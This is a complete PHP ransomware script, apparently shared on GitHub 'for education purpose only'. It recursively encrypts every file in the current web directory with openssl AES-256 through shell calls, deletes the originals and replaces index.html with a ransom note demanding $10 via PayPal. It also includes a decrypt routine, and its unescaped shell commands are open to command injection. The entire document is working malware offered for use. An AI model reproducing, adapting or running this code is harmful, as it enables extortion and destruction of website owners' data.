<?php
/*
    Ransomware With AES-256 Encryption. [SUPER STRONG ENCRYPTION]
*/
error_reporting(0);
function enc($dir,$pass,$mail){
$x=scandir($dir);
foreach($x as $xx){
if($xx=="."|$xx==".."){}
elseif(is_dir($xx)){
enc("$dir/$xx",$pass,$mail);
}else{
$base=basename($_SERVER['PHP_SELF']);
if(preg_match("/$base/",$xx)){continue;}else{
$file="$dir/$xx";
system("openssl aes-256-cbc -in '$file' -out '$file.enc' -k $pass");
if(@unlink($file)){
echo "$xx -> Encrypted !!\n";
}else{
echo "$xx -> Failed !!\n";
}
$fh=fopen('index.html',"w");
fwrite($fh,"<title>Opps?</title><center><pre>Your Website Has Been Encrypted!
All of your files has been locked.
Pay me for $10 USD to unlock your files!

PayPal
$mail");
fclose($fh);
}
}
} //akhir foreach
} //akhir fungsi
function dec($dir,$pass){
$x=scandir($dir);
foreach($x as $xx){
if($xx=="."|$xx==".."){}
elseif(is_dir($xx)){
dec("$dir/$xx",$pass);
}else{
$base=basename($_SERVER['PHP_SELF']);
if(preg_match("/$base/",$xx)){continue;}elseif(preg_match("/enc/",$xx)){
$file="$dir/$xx";
$z=explode('.',$xx);
$newf=$z[0].'.'.$z[1];
$new="$dir/$newf";
system("openssl aes-256-cbc -d -in '$file' -out '$new' -k $pass");
unlink("$dir/index.html");
if(@unlink($file)){
echo "$file -> Done!\n";
}else{echo "$file -> Failed!\n";}
}
}
}
}
function main(){
echo " -----------------
| Ransomware With | http://github.com/ahmadchen 
|   AES-256 Enc   | Warning! just for education purpose only!
 -----------------
  Version : 2.0.0\n";
}menu:
$cwd=getcwd();
$ip=$_SERVER['SERVER_ADDR'];
main();
echo "1. Encrypt\n2. Decrypt\n3. Exit\nransomware@$ip:~$ ";
$cm=trim(fgets(STDIN));
if($cm == "1"){
system("stty -echo");
echo "AES-256 Password : ";
$pass=trim(fgets(STDIN));
system("stty echo");
echo "\nYour Email : ";
$mail=trim(fgets(STDIN));
sleep(1);
echo "Encrypting ...\n";
sleep(3);
enc($cwd,$pass,$mail);
exit;
}elseif($cm == "2"){
system("stty -echo");
echo "AES-256 Password : ";
$pass=trim(fgets(STDIN));
system("stty echo");
sleep(1);
echo "\nDecrypting ...\n";
sleep(3);
dec($cwd,$pass);
exit;
}
?>
